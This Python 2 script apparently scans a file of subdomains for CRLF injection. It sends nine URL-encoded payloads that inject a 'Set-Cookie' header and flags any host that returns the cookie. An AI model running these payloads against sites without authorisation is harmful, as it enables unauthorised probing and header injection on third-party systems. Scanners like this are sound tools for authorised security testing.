import requests

# should create Set-Cookie:mycookie=myvalue header if vulnerable
PAYLOADS = [r"%0D%0ASet-Cookie:mycookie=myvalue",
            r"%0d%0aSet-Cookie:mycookie=myvalue",
            r"crlf%0dSet-Cookie:mycookie=myvalue",
            r"crlf%0aSet-Cookie:mycookie=myvalue",
            r"%23%0dSet-Cookie:mycookie=myvalue",
            r"%0dSet-Cookie:mycookie=myvalue",
            r"%0ASet-Cookie:mycookie=myvalue?foo",
            r"%0aSet-Cookie:mycookie=myvalue",
            r"/xxx%0ASet-Cookie:mycookie=myvalue;"]

# protocol either 'http://' or 'https://'
def crlf(protocol, subdomain):
    for payload in PAYLOADS:
        try:
            r = requests.get("%s%s/%s" % (protocol, subdomain, payload), verify=False, timeout=.5, allow_redirects=False)
            for name in r.cookies.keys():
                if "mycookie" in name:
                    print "[+] Vulnerable: %s%s/%s" % (protocol, subdomain, payload)
        except requests.Timeout:
            print "\tTimeout"
            return False
        except Exception as e:
            print "ERROR STRING: %s%s:8443/%s" % (protocol, subdomain, payload)
            print str(e)

if __name__ == "__main__":
	with open("rdp.txt", "r") as f:
		for subdomain in f:
			crlf("https://", subdomain)
